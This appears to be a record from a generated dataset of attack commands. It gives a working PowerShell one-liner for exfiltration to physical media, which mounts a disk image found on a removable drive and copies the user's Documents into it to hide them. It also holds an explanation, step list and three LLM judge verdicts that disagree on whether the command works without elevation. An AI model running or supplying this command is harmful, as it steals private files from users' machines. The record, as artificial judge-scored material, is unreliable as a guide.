command: $dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $img=(Get-ChildItem "$dl`:\" -Filter *.vhd* -Recurse -ErrorAction SilentlyContinue | Select -First 1 -Expand FullName); if($img){ Mount-DiskImage -ImagePath $img -NoDriveLetter:$false; $v=(Get-DiskImage -ImagePath $img | Get-Disk | Get-Partition | Get-Volume | Select -First 1 -Expand DriveLetter); $target="$v`:\$env:USERNAME"; New-Item -ItemType Directory -Force -Path $target | Out-Null; Copy-Item "$env:USERPROFILE\Documents\*" -Destination $target -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "Copied into mounted image $img at $(Get-Date)" | Out-File "$dl`:\mount_op.log" -Append; Dismount-DiskImage -ImagePath $img }
explanation: Mounts a disk image located on a removable drive and writes local documents into it, blending exfil data into an existing VHD/VHDX container.
rationale_steps: Find a VHD/VHDX file on the removable media
Mount the disk image to obtain a new volume letter
Copy local files into the mounted image
Log the action using Write-Output and unmount the image

llm_judgments.syntactic_justification: Valid PowerShell with balanced quotes, proper separators, correct escaping for drive-letter colons, and appropriate cmdlet/parameter usage.
llm_judgments.semantic_justification: It mounts a VHD on a removable drive, copies user Documents into it, logs, and dismounts—aligning with exfiltration to physical media—though it depends on an existing VHD and mounting may require elevation on some systems.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct pipeline operations, appropriate error handling with ErrorAction parameters, and proper string concatenation using backticks.
llm_judgments.semantic_justification: The command fully implements the T1052 technique by identifying a removable drive, mounting a VHD image found on it, copying user documents to the mounted image, logging the operation, and then dismounting the image - effectively hiding exfiltrated data inside an existing container on physical media.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced syntax and valid PowerShell cmdlets, parameters, and dynamic path construction, making it parseable and runnable.
llm_judgments.semantic_justification: The command fundamentally fails to achieve its claimed intent of mounting a disk image and copying data, as `Mount-DiskImage` and `Dismount-DiskImage` require elevated privileges, contrary to the stated 'Privilege: None'.
